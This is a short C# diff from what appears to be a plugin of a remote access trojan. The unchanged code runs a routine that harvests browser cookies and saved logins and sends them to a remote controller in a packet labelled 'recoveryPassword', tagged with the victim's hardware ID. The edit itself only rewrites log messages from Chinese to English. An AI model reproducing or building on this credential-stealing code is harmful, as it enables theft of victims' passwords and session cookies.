@@ -10,7 +10,6 @@ namespace Plugin
         {
             try
             {
-                Log(Connection.Hwid+":开始提取.");
                 Recorvery.Recorver();
                 MsgPack msgpack = new MsgPack();
                 msgpack.ForcePathObject("Pac_ket").AsString = "recoveryPassword";
@@ -18,7 +17,7 @@ namespace Plugin
                 msgpack.ForcePathObject("Cookies").AsString = Recorvery.totalResults;
                 msgpack.ForcePathObject("Logins").AsString = Recorvery.totallogins;
                 Connection.Send(msgpack.Encode2Bytes());
-                Log(Connection.Hwid + ":提取完毕.");
+                Log(Connection.Hwid + ":recovery success.");
             }
             catch (Exception ex)
             {
